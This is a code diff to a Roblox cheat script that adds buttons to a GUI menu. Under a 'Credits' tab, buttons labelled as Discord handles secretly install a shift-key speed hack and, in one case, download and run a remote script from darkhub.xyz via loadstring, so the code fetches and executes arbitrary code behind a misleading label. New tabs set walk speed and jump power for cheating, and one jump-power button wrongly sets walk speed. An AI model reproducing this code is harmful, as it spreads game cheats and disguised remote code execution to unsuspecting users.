@@ -15,9 +15,27 @@ local Tab = Window.NewTab("Credits")
 local Section = Tab.NewSection("Discord")
 
 local Button = Section.NewButton("ibosiktt#5391",function()
+local Player = game:GetService'Players'.LocalPlayer;
+local UIS = game:GetService'UserInputService';
+UIS.InputBegan:connect(function(UserInput)
+        if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.LeftShift then
+            _G.Running = true
+                while wait(0.005) and _G.Running == true do
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
+end
+        end
+end)
+UIS.InputEnded:connect(function(UserInput)
+        if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.LeftShift then
+                _G.Running = false
+        end
+end)
 end)
 
 local Button = Section.NewButton("Kurus#6448",function()
+loadstring(game:HttpGet("http://darkhub.xyz/remote-script.lua", true))()
 end)
 
 local Section = Tab.NewSection("Youtube")
@@ -140,6 +158,109 @@ end
         end
     end)
 end)
+
+local Tab = Window.NewTab("Walk Speed")
+
+local Section = Tab.NewSection("Walk Speed")
+
+local Button = Section.NewButton("Reset Walk Speed",function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+end)
+
+local Button = Section.NewButton("Only This W.S. Works",function()
+while game:GetService("RunService").RenderStepped:wait() do
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 27
+end
+end)
+
+local Button = Section.NewButton("WalkSpeed 50",function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
+end)
+
+local Button = Section.NewButton("WalkSpeed 100",function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
+end)
+
+local Button = Section.NewButton("WalkSpeed 150",function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 150
+end)
+
+local Button = Section.NewButton("WalkSpeed 200",function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 200
+end)
+
+local Button = Section.NewButton("WalkSpeed 250",function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 250
+end)
+
+local Button = Section.NewButton("WalkSpeed 300",function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 300
+end)
+
+local Button = Section.NewButton("WalkSpeed 350",function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 350
+end)
+
+local Button = Section.NewButton("WalkSpeed 400",function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 400
+end)
+
+local Button = Section.NewButton("WalkSpeed 450",function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 450
+end)
+
+local Button = Section.NewButton("WalkSpeed 500",function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 500
+end)
+
+local Tab = Window.NewTab("Jump Power")
+
+local Section = Tab.NewSection("Jump Power")
+
+local Button = Section.NewButton("Reset Jump Power",function()
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+end)
+
+local Button = Section.NewButton("Only This J.P. Works",function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 27
+end)
+
+local Button = Section.NewButton("Jump Power 100",function()
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100
+end)
+
+local Button = Section.NewButton("Jump Power 150",function()
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 150
+end)
+
+local Button = Section.NewButton("Jump Power 200",function()
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 200
+end)
+
+local Button = Section.NewButton("Jump Power 250",function()
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 250
+end)
+
+local Button = Section.NewButton("Jump Power 300",function()
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 300
+end)
+
+local Button = Section.NewButton("Jump Power 350",function()
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 350
+end)
+
+local Button = Section.NewButton("Jump Power 400",function()
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 400
+end)
+
+local Button = Section.NewButton("Jump Power 450",function()
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 450
+end)
+
+local Button = Section.NewButton("Jump Power 500",function()
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 500
+end)
+
 
 local Tab = Window.NewTab("Player")
 
